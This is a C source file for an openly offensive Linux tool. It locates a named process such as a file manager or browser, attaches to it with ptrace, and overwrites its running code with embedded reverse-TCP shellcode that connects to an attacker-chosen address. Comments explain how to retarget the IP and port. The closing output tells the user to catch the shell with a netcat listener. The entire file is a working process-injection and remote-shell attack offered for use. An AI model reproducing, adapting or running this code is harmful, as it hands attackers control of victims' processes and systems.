// Made By Taylor Christian Newsome <3
// GET FUCKED WINDOWS, NOW LINUX GETS IT TOO ;)

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <sys/ptrace.h>
#include <sys/wait.h>
#include <sys/user.h>

// Reverse TCP shellcode - 127.0.0.1:4444
// Change these bytes for your LHOST/LPORT:
//   \x7f\x00\x00\x01   -> your IP (little-endian)
//   \x11\x5c           -> your port in hex, network order (e.g. 0x115c = 4444)
unsigned char shellcode[] =
    "\x90\x90"  // nop sled just in case
    "\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x4d\x31\xc0"
    "\x6a\x02\x5f\x6a\x01\x5e\x6a\x06\x5a\x6a\x29\x58\x0f\x05\x49"
    "\x89\xc0\x48\x31\xf6\x4d\x31\xd2\x41\x52\xc6\x04\x24\x02\x66\xc7"
    "\x44\x24\x02\x11\x5c\xc7\x44\x24\x04\x7f\x00\x00\x01\x48\x89\xe6"
    "\x6a\x10\x5a\x41\x50\x5f\x6a\x2a\x58\x0f\x05\x48\x31\xf6\x6a\x03"
    "\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x48\x31\xff\x6a\x3b"
    "\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48\x89\xe7"
    "\x52\x57\x48\x89\xe6\x0f\x05";

pid_t find_process(const char *name)
{
    DIR *dir = opendir("/proc");
    if (!dir) return -1;

    struct dirent *ent;
    pid_t pid = -1;

    while ((ent = readdir(dir))) {
        if (!isdigit(ent->d_name[0])) continue;

        char comm_path[512];
        snprintf(comm_path, sizeof(comm_path), "/proc/%s/comm", ent->d_name);

        FILE *f = fopen(comm_path, "r");
        if (!f) continue;

        char proc_name[256];
        if (fgets(proc_name, sizeof(proc_name), f)) {
            proc_name[strcspn(proc_name, "\n")] = 0;
            if (strcmp(proc_name, name) == 0) {
                pid = atoi(ent->d_name);
                fclose(f);
                break;
            }
        }
        fclose(f);
    }
    closedir(dir);
    return pid;
}

int main(int argc, char **argv)
{
    if (argc != 2) {
        printf("Usage: %s <process_name>\n", argv[0]);
        printf("Examples: %s nautilus   (GNOME file manager = explorer.exe)\n", argv[0]);
        printf("          %s dolphin    (KDE)\n", argv[0]);
        printf("          %s firefox\n", argv[0]);
        return 1;
    }

    pid_t pid = find_process(argv[1]);
    if (pid == -1) {
        printf("[-] Process \"%s\" not found.\n", argv[1]);
        return 1;
    }

    printf("[+] Found %s at PID %d\n", argv[1], pid);

    if (ptrace(PTRACE_ATTACH, pid, NULL, NULL) < 0) {
        perror("[-] PTRACE_ATTACH");
        return 1;
    }
    waitpid(pid, NULL, 0);

    struct user_regs_struct regs;
    ptrace(PTRACE_GETREGS, pid, NULL, &regs);

    printf("[+] Current RIP: 0x%llx - injecting shellcode...\n", regs.rip);

    size_t len = sizeof(shellcode) - 1;
    unsigned long addr = regs.rip;

    union {
        unsigned long val;
        unsigned char bytes[8];
    } word;

    size_t i;
    for (i = 0; i + 8 <= len; i += 8) {
        memcpy(word.bytes, shellcode + i, 8);
        ptrace(PTRACE_POKETEXT, pid, addr + i, word.val);
    }
    // last partial word
    if (i < len) {
        word.val = ptrace(PTRACE_PEEKTEXT, pid, addr + i, NULL);
        memcpy(word.bytes, shellcode + i, len - i);
        ptrace(PTRACE_POKETEXT, pid, addr + i, word.val);
    }

    ptrace(PTRACE_DETACH, pid, NULL, NULL);

    printf("[+] Shellcode injected! Catch the reverse shell with:\n");
    printf("    nc -lvnp 4444\n");
    printf("The target process is now your shell ♡\n");

    return 0;
}
